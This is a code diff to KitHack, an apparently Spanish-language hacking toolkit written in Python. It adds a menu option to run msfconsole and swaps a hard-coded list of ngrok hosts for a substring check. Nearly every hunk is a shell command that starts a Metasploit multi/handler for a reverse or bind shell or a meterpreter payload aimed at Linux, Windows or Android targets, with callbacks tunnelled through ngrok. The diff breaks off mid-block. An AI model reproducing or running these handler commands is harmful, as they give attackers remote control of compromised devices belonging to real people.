@@ -813,6 +813,7 @@ def options():
 		print '{0}[06] {1}PYTHON {0}--> {2}Kithack.py'.format(WHITE, YELLOW, RED)
 		print '{0}[07] {1}BASH {0}--> {2}Kithack.sh'.format(WHITE, YELLOW, RED)
 		print '{0}[08] {1}PERL {0}--> {2}Kithack.pl'.format(WHITE, YELLOW, RED)
+		print '{0}[09] {1}RUN MSFCONSOLE {0}'.format(WHITE, YELLOW)		
 		print '{0} [0] {1}Back'.format(WHITE, YELLOW)
 
 		sys = input("{0}KitHack >> {1}".format(RED, DEFAULT))
@@ -854,8 +855,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:						
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista: 
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -888,8 +888,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -922,8 +921,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -956,8 +954,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -990,8 +987,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1024,8 +1020,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1058,8 +1053,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1092,8 +1086,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1126,8 +1119,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1160,8 +1152,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1194,8 +1185,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1228,8 +1218,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1288,8 +1277,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1322,8 +1310,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1356,8 +1343,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1390,8 +1376,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1424,8 +1409,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1458,8 +1442,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1492,8 +1475,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1526,8 +1508,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1560,8 +1541,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1594,8 +1574,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1628,8 +1607,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1662,8 +1640,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1696,8 +1673,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1730,8 +1706,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST: 
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1817,8 +1792,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST: 
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1849,8 +1823,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1893,8 +1866,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -1950,8 +1922,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2034,8 +2005,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2066,8 +2036,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
